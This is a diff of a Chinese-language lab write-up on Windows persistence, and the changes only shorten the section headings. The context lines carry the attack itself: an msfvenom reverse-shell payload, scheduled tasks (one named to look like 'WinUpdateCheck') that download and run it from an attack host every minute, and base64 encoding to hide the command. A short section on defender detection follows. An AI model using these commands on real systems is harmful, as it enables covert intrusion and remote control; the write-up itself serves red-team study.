@@ -5,7 +5,7 @@
 > 📅 **Date:** 2025-11-26
 > 👨‍💻 **Author:** Hackerchen716
 
-## 1. Scenario & Setup (实战背景与环境)
+## 1. Scenario & Setup 
 
 在进行 Windows 权限维持（Persistence）测试时，计划通过 `schtasks` 每分钟从攻击机拉取并执行 Payload。
 
@@ -13,7 +13,7 @@
 * **Target:** Windows 10 (Administrator)
 * **Objective:** 计划任务触发 -> 下载 -> 上线
 
-### 1.1 Payload Generation (载荷生成)
+### 1.1 Payload Generation 
 首先使用 `msfvenom` 生成一个标准的 Windows x64 反向连接 Payload (`msf.exe`)。
 
 ```bash
@@ -22,7 +22,7 @@ msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.75.129 lport=4444 -f exe
 ![Image: MSFVenom Generation](1.png)
 
 
-### 1.2 Persistence Installation (埋留后门)
+### 1.2 Persistence Installation 
 
 在受害者主机上，使用 `schtasks` 创建一个名为 "haha" 的计划任务，尝试通过 PowerShell 的 `IEX` 远程加载该 EXE。
 
@@ -35,12 +35,12 @@ schtasks /create /sc minute /mo 1 /tn "haha" /tr "powershell.exe -nop -w hidden 
 
 -----
 
-## 2\. Investigation (排查过程)
+## 2\. Investigation 
 
 **故障现象：**
 计划任务触发后，攻击机未收到 Session 回连。受害者桌面每分钟闪过蓝色窗口。
 
-### 2.1 Traffic Analysis (流量分析)
+### 2.1 Traffic Analysis 
 
 首先检查攻击机 Web 服务日志，确认受害者是否发起了请求。
 ![Image: MSFVenom Generation](3.png)
@@ -50,7 +50,7 @@ schtasks /create /sc minute /mo 1 /tn "haha" /tr "powershell.exe -nop -w hidden 
 日志显示目标主机 (.132) 已成功请求了 `msf.exe` 并返回 **200 OK**。
 这排除了网络不通或防火墙拦截的可能性。文件已经被下载到了受害者内存中，问题出在“执行”环节。
 
-### 2.2 Debugging (复现报错)
+### 2.2 Debugging 
 
 为了捕获执行错误，我移除 `-w hidden` 参数并在 PowerShell 中手动执行命令：
 
@@ -65,7 +65,7 @@ powershell.exe -nop -c "IEX((New-Object Net.WebClient).DownloadString('[http://1
 
 -----
 
-## 3\. Root Cause Analysis (根因分析)
+## 3\. Root Cause Analysis 
 
 结合流量日志和报错信息，结论如下：
 
@@ -78,7 +78,7 @@ powershell.exe -nop -c "IEX((New-Object Net.WebClient).DownloadString('[http://1
 
 -----
 
-## 4\. Solution (解决方案)
+## 4\. Solution 
 
 ### 4.1 Correct Approach (修正代码)
 
@@ -99,11 +99,11 @@ powershell -nop -c "(New-Object Net.WebClient).DownloadFile('[http://192.168.75.
 
 -----
 
-## 5\. Advanced Tradecraft (进阶优化与坑点规避)
+## 5\. Advanced Tradecraft 
 
 为了规避 CMD 中繁琐的双引号转义问题，并隐藏 URL 特征，通常建议使用 Base64 编码封装命令。
 
-### 5.1 The Length Limit (遭遇长度限制)
+### 5.1 The Length Limit 
 
 我们首先尝试将完整的“下载并执行”命令直接进行 Base64 编码：
 
@@ -118,7 +118,7 @@ $encoded = [Convert]::ToBase64String($bytes)
 然而，在执行 `schtasks` 时遇到了报错：**“/tr 选项的值不能超过 261 字符”**。这是 Windows 计划任务命令行的硬限制。
 ![Image: MSFVenom Generation](7.png)
 
-### 5.2 The Stager Solution (分阶段加载)
+### 5.2 The Stager Solution 
 
 为了解决长度问题，必须采用 **Stager（分阶段）** 模式，将 Payload 只有“加载器”留在本地，核心逻辑放在服务端。
 
@@ -161,20 +161,20 @@ schtasks /create /tn "WinUpdateCheck" /tr "powershell -enc <SHORT_BASE64_STRING>
 
 -----
 
-## 6\. Red vs Blue: Detection & Defense (攻防对抗视角)
+## 6\. Red vs Blue: Detection & Defense 
 
 > ⚠️ **Disclaimer:** 此内容仅供网络安全研究与防御检测分析使用。
 
 在成功实现持久化后，我们需要从蓝队视角审视该攻击链的脆弱性。
 
-### 6.1 The "Dropper" Risk (落地风险)
+### 6.1 The "Dropper" Risk 
 
 本实验采用了 **Dropper** 模式（DownloadFile 写入磁盘）。
 
   * **红队风险：** 现代杀软（如 Windows Defender）拥有强大的实时监控（Real-time Protection）。`msfvenom` 生成的原生 EXE 特征极其明显，文件写入磁盘瞬间（WriteFile）极易被静态查杀。
   * **进阶思路：** 转向 **无文件（Fileless）** 攻击，利用 PowerShell 反射加载 DLL 或 Shellcode，避免文件落地。
 
-### 6.2 Defensive Visibility (蓝队监测点)
+### 6.2 Defensive Visibility 
 
 防御者可以通过以下维度捕获此类攻击：
 
@@ -184,7 +184,7 @@ schtasks /create /tn "WinUpdateCheck" /tr "powershell -enc <SHORT_BASE64_STRING>
 
 -----
 
-## 7\. Conclusion (总结)
+## 7\. Conclusion 
 
 本次复盘从一个看似简单的 PowerShell 报错出发，最终演变为对 Windows 持久化机制的深度剖析。
 
